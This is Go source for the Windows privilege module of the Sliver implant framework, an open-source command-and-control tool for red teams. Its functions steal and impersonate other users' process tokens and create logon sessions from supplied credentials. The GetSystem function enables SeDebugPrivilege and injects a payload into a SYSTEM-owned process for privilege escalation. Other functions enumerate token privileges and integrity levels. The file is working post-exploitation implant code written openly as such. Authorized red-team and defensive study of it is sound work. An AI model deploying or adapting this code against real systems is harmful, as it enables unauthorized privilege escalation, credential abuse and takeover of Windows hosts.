//go:build windows
// +build windows

package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}

	"log"

	// {{end}}
	"bytes"
	"encoding/binary"
	"fmt"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/bishopfox/sliver/implant/sliver/ps"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
)

const (
	THREAD_ALL_ACCESS             = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff
	SECURITY_MANDATORY_LOW_RID    = 0x00001000
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
	SECURITY_MANDATORY_HIGH_RID   = 0x00003000
	SECURITY_MANDATORY_SYSTEM_RID = 0x00004000
)

type PrivilegeInfo struct {
	Name             string
	Description      string
	Enabled          bool
	EnabledByDefault bool
	Removed          bool
	UsedForAccess    bool
}

var CurrentToken windows.Token

func SePrivEnable(s string) error {
	var tokenHandle windows.Token
	thsHandle := windows.CurrentProcess()

	windows.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid windows.LUID
	err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func RevertToSelf() error {
	err := windows.RevertToSelf()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("RevertToSelf Error: %v\n", err)
		// {{end}}
	}
	err = windows.CloseHandle(windows.Handle(CurrentToken))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("CloseHandle Error: %v\n", err)
		// {{end}}
	}
	CurrentToken = windows.Token(0)
	return err
}

func TRevertToSelf() error {
	return windows.RevertToSelf()
}

func getPrimaryToken(pid uint32) (*windows.Token, error) {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("OpenProcess failed")
		// {{end}}
		return nil, err
	}
	defer windows.CloseHandle(handle)
	var token windows.Token
	if err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token); err != nil {
		// {{if .Config.Debug}}
		log.Println("OpenProcessToken failed")
		// {{end}}
		return nil, err
	}
	return &token, err
}

func enableCurrentThreadPrivilege(privilegeName string) error {
	ct, err := windows.GetCurrentThread()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("GetCurrentThread failed", err)
		// {{end}}
		return err
	}
	var t windows.Token
	err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("openThreadToken failed", err)
		// {{end}}
		return err
	}
	defer windows.CloseHandle(windows.Handle(t))

	var tp windows.Tokenprivileges

	privStr, err := windows.UTF16PtrFromString(privilegeName)
	if err != nil {
		return err
	}
	err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("lookupPrivilegeValue failed")
		// {{end}}
		return err
	}
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	return windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil)
}

func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
	var attr windows.SecurityAttributes
	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
	primaryToken, err := getPrimaryToken(pid)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("getPrimaryToken failed:", err)
		// {{end}}
		return
	}
	defer primaryToken.Close()

	err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return
	}
	err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr, windows.SecurityDelegation, windows.TokenPrimary, &newToken)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("duplicateTokenEx failed:", err)
		// {{end}}
		return
	}
	for _, priv := range requiredPrivileges {
		err = enableCurrentThreadPrivilege(priv)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Failed to set priv", priv)
			// {{end}}
			return
		}
	}
	return
}

func impersonateUser(username string) (token windows.Token, err error) {
	if username == "" {
		err = fmt.Errorf("username can't be empty")
		return
	}

	// We do not need full process info here, just PID and executable name
	p, err := ps.Processes(true)
	if err != nil {
		return
	}
	for _, proc := range p {
		if proc.Owner() == username {
			token, err = impersonateProcess(uint32(proc.Pid()))
			// {{if .Config.Debug}}
			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
			// {{end}}
			if err == nil {
				// {{if .Config.Debug}}
				log.Println("Got token for process", proc.Pid(), proc.Executable())
				// {{end}}
				return
			}
		}
	}
	windows.RevertToSelf()
	err = fmt.Errorf("Could not acquire a token belonging to %s", username)
	return
}

// MakeToken uses LogonUser to create a new logon session with the supplied username, domain and password.
// It then impersonates the resulting token to allow access to remote network resources as the specified user.
func MakeToken(domain string, username string, password string, logonType uint32) error {
	var token windows.Token
	// Default to LOGON32_LOGON_NEW_CREDENTIALS
	if logonType == 0 {
		logonType = syscalls.LOGON32_LOGON_NEW_CREDENTIALS
	}

	pd, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return err
	}
	pu, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return err
	}
	pp, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return err
	}
	if logonType == syscalls.LOGON32_LOGON_NEW_CREDENTIALS {
		err = syscalls.LogonUser(pu, pd, pp, logonType, syscalls.LOGON32_PROVIDER_WINNT50, &token)
	} else {
		err = syscalls.LogonUser(pu, pd, pp, logonType, syscalls.LOGON32_PROVIDER_DEFAULT, &token)
	}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("LogonUser failed: %v\n", err)
		// {{end}}
		return err
	}
	err = syscalls.ImpersonateLoggedOnUser(token)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return err
	}
	CurrentToken = token
	return err
}

func createRegistryKey(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func deleteRegistryKey(keyPath, keyName string) (err error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	err = registry.DeleteKey(key, keyName)
	return
}

func RunAs(username string, domain string, password string, program string, args string, show int, netonly bool) (err error) {
	// call CreateProcessWithLogonW to create a new process with the specified credentials
	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
	// convert username, domain, password, program, args, env, dir to *uint16
	u, err := windows.UTF16PtrFromString(username)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Invalid username\n")
		// {{end}}
		return
	}
	d, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Invalid domain\n")
		// {{end}}
		return
	}
	p, err := windows.UTF16PtrFromString(password)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Invalid password\n")
		// {{end}}
		return
	}
	prog, err := windows.UTF16PtrFromString(program)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Invalid program\n")
		// {{end}}
		return
	}
	var cmd *uint16
	if len(args) > 0 {
		cmd, err = windows.UTF16PtrFromString(fmt.Sprintf("%s %s", program, args))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Invalid prog args\n")
			// {{end}}
			return
		}
	}
	var e *uint16
	// env := os.Environ()
	// e, err = windows.UTF16PtrFromString(strings.Join(env, "\x00"))
	// if err != nil {
	// 	// {{if .Config.Debug}}
	// 	log.Printf("Invalid env\n")
	// 	// {{end}}
	// 	return
	// }
	var di *uint16

	// create a new startup info struct
	si := &syscalls.StartupInfoEx{
		StartupInfo: windows.StartupInfo{
			Flags:      windows.STARTF_USESHOWWINDOW,
			ShowWindow: uint16(show),
		},
	}
	// create a new process info struct
	pi := &windows.ProcessInformation{}
	// call CreateProcessWithLogonW
	var logonFlags uint32 = 0
	if netonly {
		logonFlags = 2 // LOGON_NETCREDENTIALS_ONLY
	}
	err = syscalls.CreateProcessWithLogonW(u, d, p, logonFlags, prog, cmd, 0, e, di, si, pi)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("CreateProcessWithLogonW failed: %v\n", err)
		// {{end}}
	}
	return
}

// RunProcessAsUser - Retrieve a primary token belonging to username
// and starts a new process using that token.
func RunProcessAsUser(username, command, args string) (out string, err error) {
	token, err := impersonateUser(username)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not impersonate user", username)
		// {{end}}
		return
	}
	cmd := exec.Command(command, args)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token: syscall.Token(token),
	}
	// {{if .Config.Debug}}
	log.Printf("Starting %s as %s\n", command, username)
	// {{end}}
	output, err := cmd.Output()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Command failed:", err)
		// {{end}}
		return
	}
	out = string(output)
	return
}

// Impersonate attempts to steal a user token and sets priv.CurrentToken
// to its value. Other functions can use priv.CurrentToken to start Processes
// impersonating the user.
func Impersonate(username string) (token windows.Token, err error) {
	token, err = impersonateUser(username)
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("impersonateUser failed:", err)
		//{{end}}
		return
	}
	CurrentToken = token
	return
}

// GetSystem starts a new RemoteTask in a SYSTEM owned process
func GetSystem(data []byte, hostingProcess string) (err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Just need PID, not all info
	procs, _ := ps.Processes(false)
	for _, p := range procs {
		if p.Executable() == hostingProcess {
			err = SePrivEnable("SeDebugPrivilege")
			if err != nil {
				// {{if .Config.Debug}}
				log.Println("SePrivEnable failed:", err)
				// {{end}}
				return
			}
			err = taskrunner.RemoteTask(p.Pid(), data, false)
			if err != nil {
				// {{if .Config.Debug}}
				log.Println("RemoteTask failed:", err)
				// {{end}}
				return
			}
			break
		}
	}
	return
}

func getProcessIntegrityLevel(processToken windows.Token) (string, error) {
	// A place to put the size of the token integrity information
	var tokenIntegrityBufferSize uint32

	// Determine the integrity of the process
	windows.GetTokenInformation(processToken, windows.TokenIntegrityLevel, nil, 0, &tokenIntegrityBufferSize)

	if tokenIntegrityBufferSize < 4 {
		// {{if .Config.Debug}}
		log.Println("TokenIntegrityBuffer is too small (must be at least 4 bytes)")
		// {{end}}
		return "Unknown", nil
	}

	tokenIntegrityBuffer := make([]byte, tokenIntegrityBufferSize)

	err := windows.GetTokenInformation(processToken,
		windows.TokenIntegrityLevel,
		&tokenIntegrityBuffer[0],
		tokenIntegrityBufferSize,
		&tokenIntegrityBufferSize,
	)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Error in call to GetTokenInformation (integrity): ", err)
		// {{end}}
		return "", err
	}

	/*
		When calling GetTokenInformation with a type of TokenIntegrityLevel, the structure we get back
		is a TOKEN_MANDATORY_LABEL (https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label)
		which has one SID_AND_ATTRIBUTES structure (https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_and_attributes)

		We need the last 4 bytes (uint32) from the structure because that contains the attributes.  The attributes
		tell us what privilege level we are operating at.
	*/

	var privilegeLevel uint32 = binary.LittleEndian.Uint32(tokenIntegrityBuffer[tokenIntegrityBufferSize-4:])

	if privilegeLevel < SECURITY_MANDATORY_LOW_RID {
		return "Untrusted", nil
	} else if privilegeLevel < SECURITY_MANDATORY_MEDIUM_RID {
		return "Low", nil
	} else if privilegeLevel >= SECURITY_MANDATORY_MEDIUM_RID && privilegeLevel < SECURITY_MANDATORY_HIGH_RID {
		return "Medium", nil
	} else if privilegeLevel >= SECURITY_MANDATORY_HIGH_RID {
		return "High", nil
	}

	return "Unknown", nil
}

func lookupPrivilegeNameByLUID(luid uint64) (string, string, error) {
	/*
	   We will need the LookupPrivilegeNameW and LookupPrivilegeDisplayNameW functions
	   https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegenamew
	   https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegedisplaynamew

	   Defined these syscalls in implant/sliver/syscalls/syscalls_windows.go and generated them with
	   mkwinsyscall, so we are good to go.

	   mkwinsyscall -output zsyscalls_windows.go syscalls_windows.go
	*/

	// Allocate 256 wide unicode characters (uint16) for the both names (255 characters plus a null terminator)
	nameBuffer := make([]uint16, 256)
	nameBufferSize := uint32(len(nameBuffer))
	displayNameBuffer := make([]uint16, 256)
	displayNameBufferSize := uint32(len(displayNameBuffer))

	// A blank string for the system name tells the call to use the local machine
	systemName := ""

	/*
	  A language ID that gets returned from LookupPrivilegeDisplayNameW
	  We do not need it for anything, but we still need to provide it
	*/
	var langID uint32

	err := syscalls.LookupPrivilegeNameW(systemName, &luid, &nameBuffer[0], &nameBufferSize)

	if err != nil {
		return "", "", err
	}

	err = syscalls.LookupPrivilegeDisplayNameW(systemName, &nameBuffer[0], &displayNameBuffer[0], &displayNameBufferSize, &langID)

	if err != nil {
		// We already got the privilege name, so we might as well return that
		return syscall.UTF16ToString(nameBuffer), "", err
	}

	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(displayNameBuffer), nil
}

func GetPrivs() ([]PrivilegeInfo, string, string, error) {
	// A place to store the process token
	var tokenHandle windows.Token

	// Process integrity
	var integrity string

	// The current process name
	var processName string

	// A place to put the size of the token information
	var tokenInfoBufferSize uint32

	// Get a handle for the current process
	currentProcHandle := windows.CurrentProcess()

	// Get the PID for the current process
	sessionPID, err := windows.GetProcessId(currentProcHandle)

	// This error is not fatal.  Worst case, we can display the PID from the registered session
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not get PID for current process: ", err)
		// {{end}}
	} else {
		// Get process info for the current PID, do not need full info
		processInformation, err := ps.FindProcess(int(sessionPID), false)

		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Could not get process information for PID %d: %v\n", sessionPID, err)
			// {{end}}
		}

		if processInformation != nil {
			processName = processInformation.Executable()
		}
	}

	// Get the process token from the current process
	err = windows.OpenProcessToken(currentProcHandle, windows.TOKEN_QUERY, &tokenHandle)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not open process token: ", err)
		// {{end}}
		return nil, integrity, processName, err
	}

	// Get the size of the token information buffer so we know how large of a buffer to allocate
	// This produces an error about a data area passed to the syscall being too small, but
	// we do not care about that because we just want to know how big of a buffer to make
	windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &tokenInfoBufferSize)

	// Make the buffer and get token information
	// Using a bytes Buffer so that we can Read from it later
	tokenInfoBuffer := bytes.NewBuffer(make([]byte, tokenInfoBufferSize))

	err = windows.GetTokenInformation(tokenHandle,
		windows.TokenPrivileges,
		&tokenInfoBuffer.Bytes()[0],
		uint32(tokenInfoBuffer.Len()),
		&tokenInfoBufferSize,
	)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Error in call to GetTokenInformation (privileges): ", err)
		// {{end}}
		return nil, integrity, processName, err
	}

	// The first 32 bits is the number of privileges in the structure
	var privilegeCount uint32
	err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &privilegeCount)

	if err != nil {
		// {{if .Config.Debug}}
		log.Println("Could not read the number of privileges from the token information.")
		// {{end}}
		return nil, integrity, processName, err
	}

	/*
		The remaining bytes contain the privileges themselves
		LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]
		Structure of the array: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid_and_attributes
	*/

	privInfo := make([]PrivilegeInfo, int(privilegeCount))

	for index := 0; index < int(privilegeCount); index++ {
		// Iterate over the privileges and make sense of them
		// In case of errors, return what we have so far and the error

		// LUIDs consist of a DWORD and a LONG
		var luid uint64

		// Attributes are up to 32 one bit flags, so a uint32 is good for that
		var attributes uint32

		var currentPrivInfo PrivilegeInfo

		// Read the LUID
		err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &luid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not read the LUID from the binary stream: ", err)
			// {{end}}
			return privInfo, integrity, processName, err
		}

		// Read the attributes
		err = binary.Read(tokenInfoBuffer, binary.LittleEndian, &attributes)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not read the attributes from the binary stream: ", err)
			// {{end}}
			return privInfo, integrity, processName, err
		}

		currentPrivInfo.Name, currentPrivInfo.Description, err = lookupPrivilegeNameByLUID(luid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("Could not get privilege info based on the LUID: ", err)
			// {{end}}
			return privInfo, integrity, processName, err
		}

		// Figure out the attributes
		currentPrivInfo.EnabledByDefault = (attributes & windows.SE_PRIVILEGE_ENABLED_BY_DEFAULT) > 0
		currentPrivInfo.UsedForAccess = (attributes & windows.SE_PRIVILEGE_USED_FOR_ACCESS) > 0
		currentPrivInfo.Enabled = (attributes & windows.SE_PRIVILEGE_ENABLED) > 0
		currentPrivInfo.Removed = (attributes & windows.SE_PRIVILEGE_REMOVED) > 0

		privInfo[index] = currentPrivInfo
	}

	// Get the process integrity before we leave
	integrity, err = getProcessIntegrityLevel(tokenHandle)

	if err != nil {
		return privInfo, "Could not determine integrity level", processName, err
	}

	return privInfo, integrity, processName, nil
}

// CurrentTokenOwner returns the current thread's token owner
func CurrentTokenOwner() (string, error) {
	currToken := CurrentToken
	// when the windows.Handle is zero (no impersonation), future method calls
	// on it result in the windows error INVALID_TOKEN_HANDLE, so we get the
	// actual handle
	if currToken == 0 {
		currToken = windows.GetCurrentProcessToken()
	}
	return TokenOwner(currToken)
}

// TokenOwner will resolve the primary token or thread owner of the given
// handle
func TokenOwner(hToken windows.Token) (string, error) {
	tokenUser, err := hToken.GetTokenUser()
	if err != nil {
		return "", err
	}
	user, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", err
	}
	return fmt.Sprintf(`%s\%s`, domain, user), err
}
